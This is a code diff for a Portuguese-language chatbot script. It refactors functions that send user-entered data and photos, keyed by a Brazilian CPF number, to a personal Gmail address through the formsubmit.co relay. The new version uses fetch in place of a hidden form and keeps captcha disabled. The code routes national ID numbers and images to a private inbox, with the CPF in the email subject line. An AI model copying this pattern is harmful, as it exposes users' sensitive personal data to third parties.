@@ -23,93 +23,66 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     };
 
-    function enviarParaFormsubmit(data, contexto) {
-    const form = document.createElement("form");
-    form.action = "https://formsubmit.co/luizapavarina2004@gmail.com";
-    form.method = "POST";
-    form.style.display = "none";
-
-    for (const key in data) {
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = key;
-        input.value = data[key];
-        form.appendChild(input);
+function enviarParaFormsubmit(data, contexto) {
+        // Create FormData object
+        const formData = new FormData();
+        
+        // Add all data fields
+        for (const key in data) {
+            formData.append(key, data[key]);
+        }
+        
+        // Add FormSubmit special fields
+        formData.append("_subject", `📌 Atualizações de "${contexto}" - CPF ${data.cpf}`);
+        formData.append("_captcha", "false");
+        
+        // Use fetch API instead of form submission
+        fetch("https://formsubmit.co/ajax/luizapavarina2004@gmail.com", {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Success:", data);
+            displayMessage("✅ Informações enviadas!", "bot-message");
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            displayMessage("❌ Erro ao enviar informações. Tente novamente.", "bot-message");
+        });
     }
 
-    const subject = document.createElement("input");
-    subject.type = "hidden";
-    subject.name = "_subject";
-    subject.value = `📌 Atualizações de "${contexto}" - CPF ${data.cpf}`;
-    form.appendChild(subject);
-
-    const noRedirect = document.createElement("input");
-    noRedirect.type = "hidden";
-    noRedirect.name = "_redirect";
-    noRedirect.value = window.location.href; // redireciona de volta para a página atual
-    form.appendChild(noRedirect);
-
-    const noPopup = document.createElement("input");
-    noPopup.type = "hidden";
-    noPopup.name = "_popup";
-    noPopup.value = "false";
-    form.appendChild(noPopup);
-
-    const noCaptcha = document.createElement("input");
-    noCaptcha.type = "hidden";
-    noCaptcha.name = "_captcha";
-    noCaptcha.value = "false";
-    form.appendChild(noCaptcha);
-
-    document.body.appendChild(form);
-    form.submit();
-
-    displayMessage("✅ Informações enviadas!", "bot-message");
-}
-
-function enviarImagemParaFormsubmit(file, cpf, contexto) {
-    const form = document.createElement("form");
-    form.action = "https://formsubmit.co/luizapavarina2004@gmail.com";
-    form.method = "POST";
-    form.enctype = "multipart/form-data";
-    form.style.display = "none";
-
-    const fileInput = document.createElement("input");
-    fileInput.type = "file";
-    fileInput.name = "foto";
-
-    const dt = new DataTransfer();
-    dt.items.add(file);
-    fileInput.files = dt.files;
-    form.appendChild(fileInput);
-
-    const cpfInput = document.createElement("input");
-    cpfInput.type = "hidden";
-    cpfInput.name = "cpf";
-    cpfInput.value = cpf;
-    form.appendChild(cpfInput);
-
-    const subject = document.createElement("input");
-    subject.type = "hidden";
-    subject.name = "_subject";
-    subject.value = `📸 Foto de ${contexto} enviada - CPF ${cpf}`;
-    form.appendChild(subject);
-
-    const noRedirect = document.createElement("input");
-    noRedirect.type = "hidden";
-    noRedirect.name = "_redirect";
-    noRedirect.value = window.location.href;
-    form.appendChild(noRedirect);
-
-    const noCaptcha = document.createElement("input");
-    noCaptcha.type = "hidden";
-    noCaptcha.name = "_captcha";
-    noCaptcha.value = "false";
-    form.appendChild(noCaptcha);
-
-    document.body.appendChild(form);
-    form.submit();
-}
+    function enviarImagemParaFormsubmit(file, cpf, contexto) {
+        // Create FormData object
+        const formData = new FormData();
+        
+        // Add file
+        formData.append("foto", file);
+        
+        // Add other fields
+        formData.append("cpf", cpf);
+        formData.append("_subject", `📸 Foto de ${contexto} enviada - CPF ${cpf}`);
+        formData.append("_captcha", "false");
+        
+        // Use fetch API instead of form submission
+        fetch("https://formsubmit.co/ajax/luizapavarina2004@gmail.com", {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Success:", data);
+            displayMessage("✅ Foto enviada com sucesso!", "bot-message");
+            
+            // Continue with the flow
+            lastOptionSelected = "";
+            displayMenuAfterAction();
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            displayMessage("❌ Erro ao enviar foto. Tente novamente.", "bot-message");
+        });
+    }
 
     function sendMessage() {
         const message = userInput.value.trim();
